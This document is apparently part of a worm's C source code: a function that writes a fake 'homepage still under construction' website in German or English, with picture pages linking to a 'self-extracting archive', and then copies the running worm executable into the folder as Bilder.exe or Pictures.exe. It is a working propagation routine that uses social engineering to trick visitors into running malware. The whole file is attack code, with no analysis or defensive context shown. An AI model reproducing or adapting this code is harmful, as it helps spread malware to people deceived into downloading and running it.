   bool CreateWebsite(char OutputDirectory[], unsigned int NumberOfPictures)
   {
       HANDLE      FileHandle;
       char        FileNumber[3];
       char        FileName[MAX_PATH];
       char        PictureName[MAX_PATH];
       DWORD       BytesWrite;
       HANDLE      IndexHandle;
       char        WormFile[MAX_PATH];
       char        DirBuff[MAX_PATH];

       char        GermanIndexHead[] =     "<html><head><title>Meine Homepage (noch in Arbeit)</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\"></head><body bgcolor=\"#000099\" text=\"#FFCC00\" link=\"#FF9900\" vlink=\"#FF9933\" alink=\"#FF9900\"><div align=\"center\"><u><h1>Willkommen, das ist meine kleine Homepage</h1></u><h2>Sorry, sie ist noch in Arbeit...</h2><h3>Aber meine Bilder kannst du jetzt schon downloaden ;)</h3><h4><a href=\"Bilder.exe\">UND ZWAR HIER (selbstentpackendes archiv)</a></h4>";
       char        GermanSubHead[] =       "<html><head><title>Bild</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\"></head><body bgcolor=\"#000099\" text=\"#FFCC00\" link=\"#FF9900\" vlink=\"#FF9900\" alink=\"#FF9900\"><div align=\"center\"><h2>Was f&uuml;r ein Bild:</h2><img alt=\"Automatisch eingef&uuml;gtes Bild...\" border=\"0\" src=\"";
       char        GermanSubFoot[] =       "\"><br><a href=\"index.htm\"><h2>ZUR&Uuml;CK</h2></a></div></body></html>";
       char        GerEngIndexFoot[] =     "</div></body></html>";
       char        GerEngLink1[] =         "<a href=\"";
       char        GerEngLink2[] =         "\"></a>";
       char        GermanImage[] =         "\"><img border=\"0\" height=\"33%\" width=\"33%\" alt=\"Automatisch eingef&uuml;gtes Bild...\" src=\"";
       char        EnglishImage[] =        "\"><img border=\"0\" height=\"33%\" width=\"33%\" alt=\"Automatic placed picture...\" src=\"";
       char        EnglishIndexHead[] =    "<html><head><title>My Homepage (still at work)</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\"></head><body bgcolor=\"#000099\" text=\"#FFCC00\" link=\"#FF9900\" vlink=\"#FF9933\" alink=\"#FF9900\"><div align=\"center\"><u><h1>Welcome, this is my little homepage</h1></u><h2>Sorry, it's not finished yet...</h2><h3>But you can already download my pictures ;)</h3><h4><a href=\"Pictures.exe\">RIGHT HERE (selfextracting archive)</a></h4>";
       char        EnglishSubHead[] =      "<html><head><title>Picture</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\"></head><body bgcolor=\"#000099\" text=\"#FFCC00\" link=\"#FF9900\" vlink=\"#FF9900\" alink=\"#FF9900\"><div align=\"center\"><h2>Nice picture:</h2><img alt=\"Automatic placed picture...\" border=\"0\" src=\"";
       char        EnglishSubFoot[] =      "\"><br><a href=\"index.htm\"><h2>GO BACK</h2></a></div></body></html>";

       if(SetCurrentDirectory(OutputDirectory) != 0)
       {
           lstrcpy(DirBuff, OutputDirectory);
           lstrcat(DirBuff, "index.htm");

           IndexHandle = CreateFile(DirBuff, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

           if(IndexHandle == INVALID_HANDLE_VALUE) return false;

           if(GermanLang() == true)
           {
               WriteFile(IndexHandle, GermanIndexHead, lstrlen(GermanIndexHead), &BytesWrite, 0);
           }
           else
           {
               WriteFile(IndexHandle, EnglishIndexHead, lstrlen(EnglishIndexHead), &BytesWrite, 0);
           }

           for(unsigned int i = 0; NumberOfPictures > i; i++)
           {
               wsprintf(FileNumber, "%d", i);

               lstrcpy(FileName, "tamiami");
               lstrcat(FileName, FileNumber);
               lstrcat(FileName, ".htm");
               lstrcpy(DirBuff, OutputDirectory);
               lstrcat(DirBuff, FileName);

               lstrcpy(PictureName, "tamiami");
               lstrcat(PictureName, FileNumber);

               FileHandle = CreateFile(DirBuff, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

               if(FileHandle != INVALID_HANDLE_VALUE)
               {
                   if(GermanLang() == true)
                   {
                       WriteFile(FileHandle, GermanSubHead, lstrlen(GermanSubHead), &BytesWrite, 0);
                       WriteFile(FileHandle, PictureName, lstrlen(PictureName), &BytesWrite, 0);
                       WriteFile(FileHandle, GermanSubFoot, lstrlen(GermanSubFoot), &BytesWrite, 0);

                       WriteFile(IndexHandle, GerEngLink1, lstrlen(GerEngLink1), &BytesWrite, 0);
                       WriteFile(IndexHandle, FileName, lstrlen(FileName), &BytesWrite, 0);
                       WriteFile(IndexHandle, GermanImage, lstrlen(GermanImage), &BytesWrite, 0);
                       WriteFile(IndexHandle, PictureName, lstrlen(PictureName), &BytesWrite, 0);
                       WriteFile(IndexHandle, GerEngLink2, lstrlen(GerEngLink2), &BytesWrite, 0);
                   }
                   else
                   {
                       WriteFile(FileHandle, EnglishSubHead, lstrlen(EnglishSubHead), &BytesWrite, 0);
                       WriteFile(FileHandle, PictureName, lstrlen(PictureName), &BytesWrite, 0);
                       WriteFile(FileHandle, EnglishSubFoot, lstrlen(EnglishSubFoot), &BytesWrite, 0);

                       WriteFile(IndexHandle, GerEngLink1, lstrlen(GerEngLink1), &BytesWrite, 0);
                       WriteFile(IndexHandle, FileName, lstrlen(FileName), &BytesWrite, 0);
                       WriteFile(IndexHandle, EnglishImage, lstrlen(EnglishImage), &BytesWrite, 0);
                       WriteFile(IndexHandle, PictureName, lstrlen(PictureName), &BytesWrite, 0);
                       WriteFile(IndexHandle, GerEngLink2, lstrlen(GerEngLink2), &BytesWrite, 0);
                   }

                   CloseHandle(FileHandle);
               }
           }

           WriteFile(IndexHandle, GerEngIndexFoot, lstrlen(GerEngIndexFoot), &BytesWrite, 0);
           CloseHandle(IndexHandle);

           if(GetModuleFileName(0, WormFile, sizeof(WormFile)) != 0)
           {
               if(GermanLang() == true)
               {
                   lstrcpy(DirBuff, OutputDirectory);
                   lstrcat(DirBuff, "Bilder.exe");
                   if(CopyFile(WormFile, DirBuff, 0) != 0) return true;
               }
               else
               {
                   lstrcpy(DirBuff, OutputDirectory);
                   lstrcat(DirBuff, "Pictures.exe");
                   if(CopyFile(WormFile, DirBuff, 0) != 0) return true;
               }
           }
           else return false;
       }

       return false;
   }
